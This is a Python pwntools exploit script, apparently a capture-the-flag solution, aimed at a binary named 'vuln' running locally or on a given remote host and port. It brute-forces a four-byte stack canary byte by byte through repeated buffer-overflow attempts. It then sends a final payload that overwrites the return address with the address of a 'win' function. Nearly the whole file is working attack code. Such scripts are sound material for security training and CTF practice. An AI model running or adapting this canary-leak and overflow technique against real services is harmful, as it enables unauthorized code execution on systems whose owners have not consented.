import argparse
import pwn


pwn.context.log_level = 'info'

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target","-t", type=str, default="",required=False)
parser.add_argument("--port","-p", type=int, default=0,required=False)

args = parser.parse_args()


elf = pwn.ELF('./vuln')

#print(elf.symbols["win"])
#p = elf.process()
#q = pwn.gdb.attach(p)


#print(p.recv().decode("utf-8"))


OFFSET = 64

new_eip = pwn.p32(elf.symbols["win"])

canary_value = bytearray(b"")

while len(canary_value) < 4:
    for byte in range(1, 256):
    
        payload = b"".join(
            [
                b"A" * OFFSET,
                canary_value + chr(byte).encode("utf-8"),
                #canary_value,
                #b"A" * (16 + (4 - len(canary_value))),
                #new_eip
            ]    
        )
#        print(f"{payload=}")

        with open("payload", "wb") as filp:
            filp.write(b"1000\n" + payload)

        if args.destination == "local":
            p = elf.process()
        elif args.destination == "remote":
            if not args.target or not args.port:
                pwn.warning("Suplly -t for target and -p for port")
                exit()
            p = pwn.remote(args.target, args.port)


        p.recvline().decode("utf-8")
        payload_size = str(len(payload)).encode("utf-8")
        #print(f"Sending payload of size: {payload_size}")
        p.sendline(payload_size)
        p.recvuntil(b"Input> ")
        p.sendline(payload)
        response = p.recvall().decode("utf-8")

        #print(f"{response=}")
        if "Flag?" in response:
            canary_value += chr(byte).encode("utf-8")
            pwn.log.info(f"leaking canary value... {canary_value}")
            break


payload = b"".join(
    [
        b"A" * OFFSET,
        canary_value,
        b"A" * (16 + (4 - len(canary_value))),
        new_eip,
    ]    
)
#print(f"{payload=}")
pwn.log.info(f"{canary_value} leaked canary value performing buffer overflow")

with open("payload", "wb") as filp:
    filp.write(b"1000\n" + payload)

if args.destination == "local":
    p = elf.process()
elif args.destination == "remote":
    if not args.target or not args.port:
        pwn.warning("Suplly -t for target and -p for port")
        exit()
    p = pwn.remote(args.target, args.port)


p.recvline().decode("utf-8")
payload_size = str(len(payload)).encode("utf-8")
print(f"Sending payload of size: {payload_size}")
p.sendline(payload_size)
p.recvuntil(b"Input> ")
p.sendline(payload)
response = p.recvall().decode("utf-8")

print(f"{response=}")